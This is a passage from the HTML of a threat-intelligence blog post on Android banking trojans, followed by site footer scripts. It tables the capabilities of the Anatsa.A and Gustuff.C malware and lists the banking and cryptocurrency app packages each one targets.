   <td>The malware can start applications</td> 
  </tr> 
  <tr> 
   <td>App installing</td> 
   <td>The malware can install applications</td> 
  </tr> 
  <tr> 
   <td>SMS spamming</td> 
   <td>The malware can perform SMS spam campaigns</td> 
  </tr> 
  <tr> 
   <td>SMS sending</td> 
   <td>The malware can send SMS messages</td> 
  </tr> 
  <tr> 
   <td>Target list update</td> 
   <td>Actors can configure targets for overlay phishing attack dynamically</td> 
  </tr> 
  <tr> 
   <td>Application listing</td> 
   <td>The malware can access list of all installed applications and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Contact list collection</td> 
   <td>The malware can read the contact list of the infected device and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Device info collection</td> 
   <td>The malware can access device related information(SIM, build info, settings) and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Accessibility event logging</td> 
   <td>The malware uses a AccessibilityService to get a stream of events happening on the device and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>SMS forwarding</td> 
   <td>The malware can forward all incoming SMS messages to a phone number controlled by actors</td> 
  </tr> 
  <tr> 
   <td>SMS listing</td> 
   <td>The malware can access the content of SMS messages and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Keylogging</td> 
   <td>The malware can log victim’s keystrokes and send them to the C2</td> 
  </tr> 
  <tr> 
   <td>Dynamic overlaying</td> 
   <td>The malware can show phishing screens to steal information. Phishing screens are retrieved from the C2</td> 
  </tr> 
 </tbody> 
</table> 
<h4 id="gustuffc">Gustuff.C</h4> 
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;"> 
 <thead> 
  <tr> 
   <th>Name</th> 
   <th>Description</th> 
  </tr> 
 </thead> 
 <tbody> 
  <tr> 
   <td>Clipboard interaction</td> 
   <td>The malware can extract data from or insert data into the device’s clipboard</td> 
  </tr> 
  <tr> 
   <td>App auto-start at device boot</td> 
   <td>The malware starts automatically when the device is turned on or restarted</td> 
  </tr> 
  <tr> 
   <td>Updatable</td> 
   <td>The malware can update itself</td> 
  </tr> 
  <tr> 
   <td>Emulation detection</td> 
   <td>The malware can detect whether or not it is running on the real device</td> 
  </tr> 
  <tr> 
   <td>App termination</td> 
   <td>The malware can terminate apps</td> 
  </tr> 
  <tr> 
   <td>Preventing removal</td> 
   <td>The malware can prevent it’s removal</td> 
  </tr> 
  <tr> 
   <td>Hiding the app icon</td> 
   <td>The malware can hide it’s icon from the application drawer</td> 
  </tr> 
  <tr> 
   <td>SMS C2</td> 
   <td>The malware is able to receive commands using incoming text messages</td> 
  </tr> 
  <tr> 
   <td>C2 update primary-channel</td> 
   <td>The malware can update the C2 using a new value/list of values received from the original C2</td> 
  </tr> 
  <tr> 
   <td>Alerts</td> 
   <td>The malware can issue Android alerts with arbitrary text</td> 
  </tr> 
  <tr> 
   <td>Push notifications</td> 
   <td>The malware can show push notifications</td> 
  </tr> 
  <tr> 
   <td>Screen locking</td> 
   <td>The malware can lock the screen of the infected device</td> 
  </tr> 
  <tr> 
   <td>Automated Transfer System</td> 
   <td>The malware uses a AccessibilityService to control the infected device and perform automated payments using the targeted banking apps</td> 
  </tr> 
  <tr> 
   <td>Web pages</td> 
   <td>The malware can show arbitrary web pages on the infected device</td> 
  </tr> 
  <tr> 
   <td>App removal</td> 
   <td>The malware can remove applications</td> 
  </tr> 
  <tr> 
   <td>App starting</td> 
   <td>The malware can start applications</td> 
  </tr> 
  <tr> 
   <td>App installing</td> 
   <td>The malware can install applications</td> 
  </tr> 
  <tr> 
   <td>SMS spamming</td> 
   <td>The malware can perform SMS spam campaigns</td> 
  </tr> 
  <tr> 
   <td>SMS sending</td> 
   <td>The malware can send SMS messages</td> 
  </tr> 
  <tr> 
   <td>Target list update</td> 
   <td>Actors can configure targets for overlay phishing attack dynamically</td> 
  </tr> 
  <tr> 
   <td>Files/pictures collection</td> 
   <td>The malware can access the file system of the infected device and upload it’s content to the C2</td> 
  </tr> 
  <tr> 
   <td>Application listing</td> 
   <td>The malware can access list of all installed applications and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Contact list collection</td> 
   <td>The malware can read the contact list of the infected device and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Device info collection</td> 
   <td>The malware can access device related information(SIM, build info, settings) and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Accessibility event logging</td> 
   <td>The malware uses a AccessibilityService to get a stream of events happening on the device and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>SMS forwarding</td> 
   <td>The malware can forward all incoming SMS messages to a phone number controlled by actors</td> 
  </tr> 
  <tr> 
   <td>SMS listing</td> 
   <td>The malware can access the content of SMS messages and send it to the C2</td> 
  </tr> 
  <tr> 
   <td>Keylogging</td> 
   <td>The malware can log victim’s keystrokes and send them to the C2</td> 
  </tr> 
  <tr> 
   <td>Dynamic overlaying</td> 
   <td>The malware can show phishing screens to steal information. Phishing screens are retrieved from the C2</td> 
  </tr> 
 </tbody> 
</table> 
<h3 id="targets">Targets</h3> 
<h4 id="anatsaa-1">Anatsa.A</h4> 
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;"> 
 <thead> 
  <tr> 
   <th>Package name</th> 
  </tr> 
 </thead> 
 <tbody> 
  <tr> 
   <td>com.db.pwcc.dbmobile</td> 
  </tr> 
  <tr> 
   <td>com.db.pbc.miabanca</td> 
  </tr> 
  <tr> 
   <td>de.fiducia.smartphone.android.banking.vr</td> 
  </tr> 
  <tr> 
   <td>es.ibercaja.ibercajaapp</td> 
  </tr> 
  <tr> 
   <td>com.bbva.bbvacontigo</td> 
  </tr> 
  <tr> 
   <td>com.mobileloft.alpha.droid</td> 
  </tr> 
  <tr> 
   <td>de.commerzbanking.mobil</td> 
  </tr> 
  <tr> 
   <td>com.cajasur.android</td> 
  </tr> 
  <tr> 
   <td>net.inverline.bancosabadell.officelocator.android</td> 
  </tr> 
  <tr> 
   <td>es.lacaixa.mobile.android.newwapicon</td> 
  </tr> 
  <tr> 
   <td>com.rsi</td> 
  </tr> 
  <tr> 
   <td>eu.unicreditgroup.hvbapptan</td> 
  </tr> 
  <tr> 
   <td>com.binance.dev</td> 
  </tr> 
  <tr> 
   <td>es.bancosantander.apps</td> 
  </tr> 
  <tr> 
   <td>de.sdvrz.ihb.mobile.secureapp.sparda.produktion</td> 
  </tr> 
  <tr> 
   <td>piuk.blockchain.android</td> 
  </tr> 
  <tr> 
   <td>de.postbank.finanzassistent</td> 
  </tr> 
  <tr> 
   <td>es.openbank.mobile</td> 
  </tr> 
  <tr> 
   <td>es.cm.android</td> 
  </tr> 
  <tr> 
   <td>es.liberbank.cajasturapp</td> 
  </tr> 
  <tr> 
   <td>de.ingdiba.bankingapp</td> 
  </tr> 
  <tr> 
   <td>es.univia.unicajamovil</td> 
  </tr> 
  <tr> 
   <td>com.grupocajamar.wefferent</td> 
  </tr> 
  <tr> 
   <td>de.santander.presentation</td> 
  </tr> 
  <tr> 
   <td>de.comdirect.android</td> 
  </tr> 
  <tr> 
   <td>app.wizink.es</td> 
  </tr> 
  <tr> 
   <td>com.coinbase.android</td> 
  </tr> 
  <tr> 
   <td>com.starfinanz.smob.android.sfinanzstatus</td> 
  </tr> 
  <tr> 
   <td>com.kutxabank.android</td> 
  </tr> 
  <tr> 
   <td>vivid.money</td> 
  </tr> 
  <tr> 
   <td>de.traktorpool</td> 
  </tr> 
  <tr> 
   <td>www.ingdirect.nativeframe</td> 
  </tr> 
 </tbody> 
</table> 
<h4 id="gustuffc-1">Gustuff.C</h4> 
<table style="border-collapse: collapse; table-layout: fixed; margin-left: auto; margin-right: auto; border: 1px solid #99acc2;"> 
 <thead> 
  <tr> 
   <th>Package name</th> 
  </tr> 
 </thead> 
 <tbody> 
  <tr> 
   <td>au.com.bankwest.mobile</td> 
  </tr> 
  <tr> 
   <td>au.com.ingdirect.android</td> 
  </tr> 
  <tr> 
   <td>au.com.nab.mobile</td> 
  </tr> 
  <tr> 
   <td>au.com.suncorp.SuncorpBank</td> 
  </tr> 
  <tr> 
   <td>au.com.ubank.internetbanking</td> 
  </tr> 
  <tr> 
   <td>bcc.org.freewallet.app</td> 
  </tr> 
  <tr> 
   <td>bcn.org.freewallet.app</td> 
  </tr> 
  <tr> 
   <td>btc.org.freewallet.app</td> 
  </tr> 
  <tr> 
   <td>btg.org.freewallet.app</td> 
  </tr> 
  <tr> 
   <td>o.edgesecure.app</td> 
  </tr> 
  <tr> 
   <td>com.airbitz</td> 
  </tr> 
  <tr> 
   <td>com.android.vending</td> 
  </tr> 
  <tr> 
   <td>com.anz.android</td> 
  </tr> 
  <tr> 
   <td>com.anz.android.gomoney</td> 
  </tr> 
  <tr> 
   <td>com.arcbit.arcbit</td> 
  </tr> 
  <tr> 
   <td>com.barclays.android.barclaysmobilebanking</td> 
  </tr> 
  <tr> 
   <td>com.barclays.bca</td> 
  </tr> 
  <tr> 
   <td>com.bitcoin.mwallet</td> 
  </tr> 
  <tr> 
   <td>com.bitcoin.wallet</td> 
  </tr> 
  <tr> 
   <td>com.bitpay.copay</td> 
  </tr> 
  <tr> 
   <td>com.bitpay.wallet</td> 
  </tr> 
  <tr> 
   <td>com.bitpie</td> 
  </tr> 
  <tr> 
   <td>com.btcontract.wallet</td> 
  </tr> 
  <tr> 
   <td>com.circle.android</td> 
  </tr> 
  <tr> 
   <td>com.citibank.mobile.au</td> 
  </tr> 
  <tr> 
   <td>com.coinbase.android</td> 
  </tr> 
  <tr> 
   <td>com.coincorner.app.crypt</td> 
  </tr> 
  <tr> 
   <td>com.coinspace.app</td> 
  </tr> 
  <tr> 
   <td>com.commbank.netbank</td> 
  </tr> 
  <tr> 
   <td>com.cooperativebank.bank</td> 
  </tr> 
  <tr> 
   <td>com.grppl.android.shell.BOS</td> 
  </tr> 
  <tr> 
   <td>com.grppl.android.shell.CMBlloydsTSB73</td> 
  </tr> 
  <tr> 
   <td>com.grppl.android.shell.halifax</td> 
  </tr> 
  <tr> 
   <td>com.hashengineering.bitcoincash.wallet</td> 
  </tr> 
  <tr> 
   <td>com.kibou.bitcoin</td> 
  </tr> 
  <tr> 
   <td>com.kryptokit.jaxx</td> 
  </tr> 
  <tr> 
   <td>com.lloydsbank.businessmobile</td> 
  </tr> 
  <tr> 
   <td>сom.moneybookers.skrillpayments</td> 
  </tr> 
  <tr> 
   <td>com.monitise.client.android.yorkshire</td> 
  </tr> 
  <tr> 
   <td>com.nearform.ptsb</td> 
  </tr> 
  <tr> 
   <td>com.plutus.wallet</td> 
  </tr> 
  <tr> 
   <td>com.qcan.mobile.bitcoin.wallet</td> 
  </tr> 
  <tr> 
   <td>com.rbs.mobile.android.natwest</td> 
  </tr> 
  <tr> 
   <td>com.rbs.mobile.android.rbs</td> 
  </tr> 
  <tr> 
   <td>com.westernunion.android.mtapp</td> 
  </tr> 
  <tr> 
   <td>com.wirex</td> 
  </tr> 
  <tr> 
   <td>com.xapo</td> 
  </tr> 
  <tr> 
   <td>de.schildbach.wallet_test</td> 
  </tr> 
  <tr> 
   <td>distributedlab.wallet</td> 
  </tr> 
  <tr> 
   <td>eth.org.freewallet.app</td> 
  </tr> 
  <tr> 
   <td>lt.spectrofinance.spectrocoin.android.wallet</td> 
  </tr> 
  <tr> 
   <td>me.cryptopay.android</td> 
  </tr> 
  <tr> 
   <td>net.bither</td> 
  </tr> 
  <tr> 
   <td>org.banksa.bankß</td> 
  </tr> 
  <tr> 
   <td>org.bom.bank</td> 
  </tr> 
  <tr> 
   <td>org.electrum.electrum</td> 
  </tr> 
  <tr> 
   <td>org.stgeorge.bank</td> 
  </tr> 
  <tr> 
   <td>org.vikulin.etherwallet</td> 
  </tr> 
  <tr> 
   <td>org.westpac.bank</td> 
  </tr> 
  <tr> 
   <td>piuk.blockchain.android</td> 
  </tr> 
  <tr> 
   <td>tsb.mobilebanking</td> 
  </tr> 
  <tr> 
   <td>uk.co.hsbc.hsbcukbusinessbanking</td> 
  </tr> 
  <tr> 
   <td>uk.co.hsbc.hsbcukmobilebanking</td> 
  </tr> 
  <tr> 
   <td>uk.co.mbna.cardservices.android</td> 
  </tr> 
  <tr> 
   <td>uk.co.metrobankonline.mobile.android.production</td> 
  </tr> 
  <tr> 
   <td>uk.co.santander.businessUK.bb</td> 
  </tr> 
  <tr> 
   <td>uk.co.santander.santanderUK</td> 
  </tr> 
  <tr> 
   <td>uk.co.tescomobile.android</td> 
  </tr> 
  <tr> 
   <td>uk.co.tsb.newmobilebank</td> 
  </tr> 
 </tbody> 
</table> 
<h2>&nbsp;</h2> 
<h2 id="catalysts"></h2></span>
					</div>
					
<!-- 					<div class="tb:hidden mt-12">
						
  
		<a href="https://www.threatfabric.com/blogs/bianlian_from_rags_to_riches_the_malware_dropper_that_had_a_dream" class="block text-base my-4">
			<label class="text-base-400 text-sm">Oct 1, 2018 2:56:00 AM</label>
			<p class="font-bold">BianLian - from rags to riches, the malware dropper that had a dream</p>
		</a>
	

  
		<a href="https://www.threatfabric.com/blogs/alien_the_story_of_cerberus_demise" class="block text-base my-4">
			<label class="text-base-400 text-sm">Sep 1, 2020 2:56:00 AM</label>
			<p class="font-bold">Alien - the story of Cerberus' demise</p>
		</a>
	

  
		<a href="https://www.threatfabric.com/blogs/sova-new-trojan-with-fowl-intentions" class="block text-base my-4">
			<label class="text-base-400 text-sm">Sep 9, 2021 2:56:00 AM</label>
			<p class="font-bold">S.O.V.A. - A new Android Banking trojan with fowl intentions</p>
		</a>
	


					</div> -->
				</div>
			</div>
		</div>
		
		
		
	</div>
	
	
  
  
  <div id="hs_cos_wrapper_module_16766034125746" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">
  
  
    
  
 


<div class="blog-post-01_cta-divider">
    <div class="dnd-section blog-post-01_cta relative module_16766034125746 bg-cover bg-bottom bg-no-repeat">
    
    <div class="row-fluid">
      <div class="relative  text-center inherit">
        <div class="">
          
            <h2 class="text-base">Questions or demo?</h2>
          
          
            
            <a href="https://www.threatfabric.com/contact" class="relative btn btn-m btn-solid btn-primary text-white fill-white btn-icon-back ">
              
                CONTACT US
                
            </a>
            
          
        </div>
      </div>
    </div>
  </div>
</div>


</div>
		
</div>






			</div>
      
			
      <div data-global-resource-path="Threatfabric_Hatch/templates/partials/footer.html">

  <div class="container-fluid">
<div class="row-fluid-wrapper">
<div class="row-fluid">
<div class="span12 widget-span widget-type-cell " style="" data-widget-type="cell" data-x="0" data-w="12">

<div class="row-fluid-wrapper row-depth-1 row-number-1 footer-global-row-0-padding dnd-section footer-global-row-0-force-full-width-section footer-global-row-0-vertical-alignment">
<div class="row-fluid ">
<div class="span12 widget-span widget-type-custom_widget dnd-module footer-global-module-1-vertical-alignment" style="" data-widget-type="custom_widget" data-x="0" data-w="12">
<div id="hs_cos_wrapper_footer-global-module-1" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_module" style="" data-hs-cos-general-type="widget" data-hs-cos-type="module">





  
  












<footer class="relative w-full overflow-hidden ">

	
	
		
		<div class="relative footer-row pt-12 pb-2">

			
				<div class="absolute left-0 top-0 w-full h-full bg-base-500 opacity-100"></div>
			

			<div class="relative container">
				<div class="tb:flex items-center tb:flex-wrap -mx-4 text-white heading-default">

					
					
					<div class="tb:w-2/12 px-4 mb:mb-4 text-left mb:text-center">


						
						
						<div class="">

							
								
							

							
							
							

							
							
								<div class="flex items-center flex-wrap -mx-2">
									
										<div class="w-1/1 p-2">
											<img src="https://www.threatfabric.com/hubfs/Threatfabric/logos/threatfabric-logo-light.svg" alt="threatfabric-logo-light" loading="lazy">
										</div>
									
								</div>
							

							
							
							



						</div>
						
						


					</div>
					
					<div class="tb:w-8/12 px-4 mb:mb-4 text-center mb:text-center">


						
						
						<div class="">

							
								
							

							
							
							

							
							
								<div class="footer-inline-menu"><span id="hs_cos_wrapper_footer-global-module-1_" class="hs_cos_wrapper hs_cos_wrapper_widget hs_cos_wrapper_type_simple_menu" style="" data-hs-cos-general-type="widget" data-hs-cos-type="simple_menu"><div id="hs_menu_wrapper_footer-global-module-1_" class="hs-menu-wrapper active-branch flyouts hs-menu-flow-horizontal" role="navigation" data-sitemap-name="" data-menu-id="" aria-label="Navigation Menu">
 <ul role="menu">
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.threatfabric.com/jobs" role="menuitem" target="_self">JOBS</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.threatfabric.com/privacy" role="menuitem" target="_self">PRIVACY</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.threatfabric.com/contact" role="menuitem" target="_self">INTEL/PGP</a></li>
  <li class="hs-menu-item hs-menu-depth-1" role="none"><a href="https://www.threatfabric.com/vulnerability-disclosure-policy" role="menuitem" target="_self">VULNERABILITY DISCLOSURE</a></li>
 </ul>
</div></span></div>
							

							
							
							



						</div>
						
						


					</div>
					
					<div class="tb:w-2/12 px-4  text-right mb:text-center">


						
						
						<div class="">

							
								
							

							
							
							

							
							
									<div class="inline-flex items-center -m-1">
										
										<a class="icon icon-prebuilt-radius icon-xs shadow-lg bg-white-500 text-base prebuilt-hover m-1" href="https://www.linkedin.com/company/threatfabric" target="_blank" rel="noopener"><svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 448 512" aria-hidden="true"><g id="LinkedIn In1_layer"><path d="M100.28 448H7.4V148.9h92.88zM53.79 108.1C24.09 108.1 0 83.5 0 53.8a53.79 53.79 0 0 1 107.58 0c0 29.7-24.1 54.3-53.79 54.3zM447.9 448h-92.68V302.4c0-34.7-.7-79.2-48.29-79.2-48.29 0-55.69 37.7-55.69 76.7V448h-92.78V148.9h89.08v40.8h1.3c12.4-23.5 42.69-48.3 87.88-48.3 94 0 111.28 61.9 111.28 142.3V448z" /></g></svg></a>
										
										<a class="icon icon-prebuilt-radius icon-xs shadow-lg bg-white-500 text-base prebuilt-hover m-1" href="https://twitter.com/threatfabric" target="_blank" rel="noopener"><svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512" aria-hidden="true"><g id="Twitter2_layer"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z" /></g></svg></a>
										
									</div>
							
							



						</div>
						
						


					</div>
					
					

				</div>
			</div>

			

		</div>
	  
	
		
		<div class="relative footer-row pt-2 pb-16">

			
				<div class="absolute left-0 top-0 w-full h-full bg-base-500 opacity-100"></div>
			

			<div class="relative container">
				<div class="tb:flex items-center tb:flex-wrap -mx-4 text-white heading-default">

					
					
					<div class="tb:w-full px-4  text-center inherit">


						
						
						<div class="">

							
								
							

							
							
							

							
							
								<div class="flex items-center flex-wrap -mx-2">
									
										<div class="w-1/1 p-2">
											<img src="https://www.threatfabric.com/hubfs/40185.png" alt="40185" loading="lazy">
										</div>
									
								</div>
							

							
							
							



						</div>
						
						


					</div>
					
					

				</div>
			</div>

			

		</div>
	  
	
	

	
	
	  <a href="#" class="prebuilt-radius scroll-top flex items-center justify-center text-primary"><svg version="1.0" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 448 512" aria-hidden="true"><g id="chevron-up1_layer"><path d="M240.971 130.524l194.343 194.343c9.373 9.373 9.373 24.569 0 33.941l-22.667 22.667c-9.357 9.357-24.522 9.375-33.901.04L224 227.495 69.255 381.516c-9.379 9.335-24.544 9.317-33.901-.04l-22.667-22.667c-9.373-9.373-9.373-24.569 0-33.941L207.03 130.525c9.372-9.373 24.568-9.373 33.941-.001z" /></g></svg></a>
	
	
</footer></div>

</div><!--end widget-span -->
</div><!--end row-->
</div><!--end row-wrapper -->

</div><!--end widget-span -->
</div>
</div>
</div>

</div>
			
			
    </div>

		
		
			
			
		

		
    
    

		
    
<!-- HubSpot performance collection script -->
<script defer src="/hs/hsstatic/content-cwv-embed/static-1.1293/embed.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-migrate/3.3.1/jquery-migrate.min.js"></script>

		  <script defer src="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/100565705870/1741944194135/template_plugins.min.js"></script>
		
<script defer src="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/100565738928/1741944208180/template_main.min.js"></script>
<script src="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/101040014386/1741944259136/template_child.min.js"></script>
<script>
var hsVars = hsVars || {}; hsVars['language'] = 'en';
</script>

<script src="/hs/hsstatic/cos-i18n/static-1.53/bundles/project.js"></script>
<script src="https://7052064.fs1.hubspotusercontent-na1.net/hubfs/7052064/hub_generated/module_assets/1/-2712622/1742393214965/module_search_input.min.js"></script>
<script src="https://www.threatfabric.com/hs-fs/hubfs/hub_generated/template_assets/1/100565906251/1741944221858/template_blog.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/js-beautify/1.14.8/beautify.min.js"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.24.1/prism.min.js"></script>

<!-- Start of HubSpot Analytics Code -->
<script type="text/javascript">
var _hsq = _hsq || [];
_hsq.push(["setContentType", "blog-post"]);
_hsq.push(["setCanonicalUrl", "https:\/\/www.threatfabric.com\/blogs\/the-rage-of-android-banking-trojans"]);
_hsq.push(["setPageId", "104395289364"]);
_hsq.push(["setContentMetadata", {
    "contentPageId": 104395289364,
    "legacyPageId": "104395289364",
    "contentFolderId": null,
    "contentGroupId": 101307487134,
    "abTestId": null,
    "languageVariantId": 104395289364,
    "languageCode": "en",
    
    
}]);
</script>

<script type="text/javascript" id="hs-script-loader" async defer src="/hs/scriptloader/6701575.js"></script>
<!-- End of HubSpot Analytics Code -->


<script type="text/javascript">
var hsVars = {
    render_id: "d432e21a-9ad1-474e-a306-aa2b2a2c5a62",
    ticks: 1742425702958,
    page_id: 104395289364,
    
    content_group_id: 101307487134,
    portal_id: 6701575,
    app_hs_base_url: "https://app.hubspot.com",
    cp_hs_base_url: "https://cp.hubspot.com",
    language: "en",
    analytics_page_type: "blog-post",
    scp_content_type: "",
    
    analytics_page_id: "104395289364",
    category_id: 3,
    folder_id: 0,
    is_hubspot_user: false
}
</script>


<script defer src="/hs/hsstatic/HubspotToolsMenu/static-1.432/js/index.js"></script>

<!-- Override cookiebar styling (because the cookiebar styling is directly injected in the HEAD) -->
<style>
  /* Correct TF typography */
  div#hs-eu-cookie-confirmation div#hs-eu-cookie-confirmation-inner p { 
	font-family: 'Kanit', sans-serif;
    font-weight: 300;
  }
  
  /* Neutral ACCEPT button */
  div#hs-eu-cookie-confirmation div#hs-eu-cookie-confirmation-inner button#hs-eu-confirmation-button { 
  	background: var(--white) !important;
    color: var(--secondary) !important;
  }
</style>

<script type="text/javascript">
_linkedin_partner_id = "3969834";
window._linkedin_data_partner_ids = window._linkedin_data_partner_ids || [];
window._linkedin_data_partner_ids.push(_linkedin_partner_id);
</script><script type="text/javascript">
(function(l) {
if (!l){window.lintrk = function(a,b){window.lintrk.q.push([a,b])};
window.lintrk.q=[]}
var s = document.getElementsByTagName("script")[0];
var b = document.createElement("script");
b.type = "text/javascript";b.async = true;
b.src = "https://snap.licdn.com/li.lms-analytics/insight.min.js";
s.parentNode.insertBefore(b, s);})(window.lintrk);
</script>
<noscript>
<img height="1" width="1" style="display:none;" alt="" src="https://px.ads.linkedin.com/collect/?pid=3969834&amp;fmt=gif">
</noscript>

<!-- Start of HubSpot Embed Code -->
<script type="text/javascript" id="hs-script-loader" async defer src="//js.hs-scripts.com/6701575.js"></script>
<!-- End of HubSpot Embed Code -->

<div id="fb-root"></div>
  <script>(function(d, s, id) {
  var js, fjs = d.getElementsByTagName(s)[0];
  if (d.getElementById(id)) return;
  js = d.createElement(s); js.id = id;
  js.src = "//connect.facebook.net/en_GB/sdk.js#xfbml=1&version=v3.0";
  fjs.parentNode.insertBefore(js, fjs);
 }(document, 'script', 'facebook-jssdk'));</script> <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="https://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
 


  
</body></html>